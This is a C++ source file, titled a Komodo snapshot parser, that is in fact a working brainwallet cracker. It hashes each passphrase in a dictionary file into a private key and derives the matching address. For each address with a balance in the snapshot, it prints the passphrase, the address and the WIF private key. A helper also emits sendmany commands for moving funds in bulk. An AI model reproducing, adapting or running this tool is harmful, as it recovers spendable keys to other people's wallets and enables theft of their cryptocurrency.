/***
 *
 *  Komodo Snapshot C++ Parser (c) Decker, 2020
 *
*/

#include <iostream>
#include <stdint.h>
#include <map>
#include <set>
#include <algorithm>
#include <functional>

#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/reader.h"
#include "rapidjson/filereadstream.h"

#include "utilstrencodings.h"
#include "tinyformat.h"

#include <fstream>
#include <chrono>

using namespace rapidjson;

#include <bitcoin/system.hpp>
using namespace libbitcoin::system;

/* changeable params */
static const std::size_t MAX_SENDMANY_OUTPUTS = 10;
static const bool useExtendedScript = false;
static const std::set<std::string> setExcludeAddresses = {
    "RBatmanSuperManPaddingtonBearpcCTt",
    };

/* below is no user changeable params */
typedef int64_t CAmount;
typedef std::pair<std::string, CAmount> CBalanceRecord;
typedef std::vector< CBalanceRecord > CSendManyOutput;

static const CAmount COIN = 100000000;
static const CAmount CENT = 1000000;

static const CAmount MAX_MONEY = 21000000 * COIN;

static const std::string CL_GREEN = "\x1b[01;32m";
static const std::string CL_NORMAL = "\x1B[0m";

inline bool MoneyRange(const CAmount& nValue) { return (nValue >= 0 && nValue <= MAX_MONEY); }

int64_t AmountFromValue(const rapidjson::Value &value)
{
    if (!value.IsString()) throw std::runtime_error("Amount is not string");
    CAmount amount;
    if (!ParseFixedPoint(value.GetString(), 8, &amount)) throw std::runtime_error("Invalid amount");
    if (!MoneyRange(amount)) throw std::runtime_error("Amount out of range");
    return amount;
}

std::string ValueFromAmount(const CAmount& amount)
{
    bool sign = amount < 0;
    int64_t n_abs = (sign ? -amount : amount);
    int64_t quotient = n_abs / COIN;
    int64_t remainder = n_abs % COIN;
    return strprintf("%s%d.%08d", sign ? "-" : "", quotient, remainder);
}

void PrintSendManyCli(std::ostream& ostr, const CSendManyOutput &vec, int64_t txcount, bool fProduceScriptEx = false)
{
    static const int64_t confirmations = 0;
    if (vec.size() > 0) {
        if (fProduceScriptEx) {
            ostr << "while true; do" << std::endl << "echo -e \"Executing tx \x1b[01;32m#"<< txcount << "\x1B[0m ... \"" << std::endl;
        }
        ostr << "./komodo-cli -ac_name=VOTE2020 sendmany \"\" \"{";
        for (CSendManyOutput::const_iterator iter = vec.begin(); iter != vec.end(); ++iter)
	    {
            if ((*iter).second > 0)
                ostr << "\\\"" << (*iter).first << "\\\":\\\"" << ValueFromAmount((*iter).second) << "\\\"" << ((std::distance( iter, vec.end() ) != 1) ? "," : "");
        }
        ostr << "}\" " << confirmations << " \"tx." << txcount << "\"" << std::endl;
        if (fProduceScriptEx) {
            ostr << "    if [ $? -eq 0 ]; then" << std::endl;
            ostr << "    break" << std::endl;
            ostr << "    fi" << std::endl;
            ostr << "    sleep 1" << std::endl;
            ostr << "done" << std::endl;
            ostr << std::endl;
        }
    }
}

// https://stackoverflow.com/questions/216823/whats-the-best-way-to-trim-stdstring
// trim from end (in place)
static inline void rtrim(std::string &s) {
    s.erase(std::find_if(s.rbegin(), s.rend(), [](int ch) {
        return !std::isspace(ch);
    }).base(), s.end());
}

int main()
{

    Document d;
    std::map<std::string, int64_t> mapBalances;
    
    // Prepare JSON reader and input stream.
    FILE *fp = fopen("snapshot.json", "r");
    if (!fp) {
        std::cerr << "Can't find snapshot.json. Exiting." << std::endl;
        return -1;
    }
    
    Reader reader;
    char readBuffer[65536];
    FileReadStream is(fp /*stdin*/, readBuffer, sizeof(readBuffer));

    if (d.ParseStream(is).HasParseError()) {
        std::cerr << "JSON parse error. Exiting." << std::endl;
        fclose(fp);
        return -1;
    }

    int64_t totalAddressesInJson = 0;
    if (d.HasMember("addresses") && d["addresses"].IsArray()) {
        const Value& a = d["addresses"];
        totalAddressesInJson = a.Size();
        std::cerr << "Parsing " << totalAddressesInJson << " adresses - ";
        for (SizeType i = 0; i < totalAddressesInJson; i++) {
            if (a[i].IsObject()) {
                const Value& el = a[i];
                if (el.HasMember("addr") && el.HasMember("amount")) {
                    if (el["addr"].IsString() && el["amount"].IsString()) {
                        mapBalances[el["addr"].GetString()] = AmountFromValue(el["amount"]);
                    }
                }
            }
        }

    }

    if (totalAddressesInJson != mapBalances.size()) {
        std::cerr << "only " << mapBalances.size() << " valid! Exiting." << std::endl;
        return -1;
    }

    std::cerr << "Ok!" << std::endl;

    // https://stackoverflow.com/questions/7868936/read-file-line-by-line-using-ifstream-in-c
    std::ifstream input( "dict.txt" );
    std::set<std::string> setPasswords;
    
    {
        // read dictionary
        auto start = std::chrono::steady_clock::now();
        for( std::string line; getline( input, line ); )
        {
            rtrim(line);
            setPasswords.insert(line);
        }
        auto end = std::chrono::steady_clock::now();

        std::cerr << "Total passwords: " << setPasswords.size()
            << " (" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms)" << std::endl;
    }

    ec_secret privkey;
    ec_compressed pubkey;
    one_byte addr_prefix;
    data_chunk prefix_pubkey_checksum;
    std::string kmd_addr;

    int64_t n = 0;
    auto start = std::chrono::steady_clock::now();

    for (std::set<std::string>::const_iterator iter = setPasswords.begin(); iter != setPasswords.end(); ++iter) {

        std::string passphrase = *iter;

        std::vector<char> passphrase_bytes(passphrase.begin(), passphrase.end());
        auto passphrase_data_slice = data_slice((const uint8_t *)passphrase_bytes.data(),(const uint8_t *)(passphrase_bytes.data() + passphrase_bytes.size()));
        auto sha256sum = sha256_hash(passphrase_data_slice);

        sha256sum[0]  = sha256sum[0] & 248;
        sha256sum[31] = sha256sum[31] & 127;
        sha256sum[31] = sha256sum[31] | 64;

        //auto sha256sum_hex = encode_base16(sha256sum);
        //std::cerr << passphrase << " - " << sha256sum_hex << std::endl;
        //decode_base16(privkey, sha256sum_hex);
        //secret_to_public(pubkey, privkey);
        privkey = sha256sum;

        secret_to_public(pubkey,privkey);
        std::string pubkeyhex_str = encode_base16(pubkey);

        // Pubkeyhash: sha256 + hash160
        auto my_pubkeyhash = bitcoin_short_hash(pubkey);

        addr_prefix = { { 60 } };
        // Byte sequence = prefix + pubkey + checksum(4-bytes)
        prefix_pubkey_checksum = to_chunk(addr_prefix);
        extend_data(prefix_pubkey_checksum, my_pubkeyhash);
        append_checksum(prefix_pubkey_checksum);
        // Base58 encode byte sequence -> Bitcoin Address
        kmd_addr = encode_base58(prefix_pubkey_checksum);

        if (n % 500000 == 0) {
            auto end = std::chrono::steady_clock::now();
            std::cerr << "[" << n << "/" << setPasswords.size() << "] "
                << "" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms" << std::endl;
            // std::cerr << "mapBalances.size() = " << mapBalances.size() << std::endl;
            start = end;
        }


        // if (mapBalances[kmd_addr] != 0) // (!) never use std::map [] construction for reading, it creates element in map (!)
        auto it = mapBalances.find(kmd_addr);
        if ( it != mapBalances.end())
        {
            one_byte secret_prefix = { { 188 } };
            one_byte secret_compressed = { { 0x01 } }; // omitted if uncompressed
            // Apply prefix, suffix & append checksum
            auto prefix_secret_comp_checksum = to_chunk(secret_prefix);
            extend_data(prefix_secret_comp_checksum, privkey);
            extend_data(prefix_secret_comp_checksum, secret_compressed);
            append_checksum(prefix_secret_comp_checksum);

            std::string kmd_wif = encode_base58(prefix_secret_comp_checksum);
            std::cout << passphrase << " - " << kmd_addr << " (" << kmd_wif << ") - " << CL_GREEN << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
        }

        n++;
    }

    return 0;
}
